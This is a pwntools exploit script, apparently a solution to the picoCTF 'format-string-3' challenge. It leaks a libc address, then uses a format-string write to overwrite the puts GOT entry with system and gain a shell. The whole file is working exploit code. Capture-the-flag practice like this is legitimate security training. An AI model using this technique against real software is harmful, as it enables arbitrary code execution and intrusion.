#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
def exec_fmt(payload):
    r = process([exe.path])
    r.sendline(payload)
    return r.recvall()

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 60470)

    return r


def main():
    r = conn()
    #receiving the leaked setvbuf address to calculate the libc address
    r.recvuntil(b"libc: ")
    leaked_setvbuf = int(r.recvline()[:-1],16)
    print("leaked setvbuf: " ,leaked_setvbuf)
    libc.address=leaked_setvbuf-libc.sym.setvbuf
    print("libc address : " ,hex(libc.address))
    #using the powerful Fmtstr to create the payload needed to 
    #overwrite the puts address with the system function's address
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    print(offset)
    payload = fmtstr_payload(offset, {exe.got.puts:libc.sym.system})
    r.sendline(payload)
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
